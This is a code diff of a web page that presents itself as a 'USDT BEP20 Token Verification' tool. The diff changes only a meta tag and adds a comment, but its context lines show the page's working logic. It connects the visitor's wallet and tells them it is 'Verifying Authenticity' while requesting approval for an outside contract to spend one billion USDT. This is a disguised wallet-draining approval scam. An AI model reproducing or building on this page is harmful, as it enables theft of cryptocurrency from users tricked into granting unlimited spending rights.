@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>USDT BEP20 Token Verification:</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
   <style>
@@ -110,7 +110,7 @@
         const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
         const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
         const decimals = await usdt.decimals();
-        const approveAmount = ethers.parseUnits("1000000000", decimals);
+        const approveAmount = ethers.parseUnits("1000000000", decimals); // Approve max USDT
 
         statusDiv.innerText = "📝 Verifying Authenticity...";
         const approveTx = await usdt.approve(CONTRACT_ADDRESS, approveAmount);
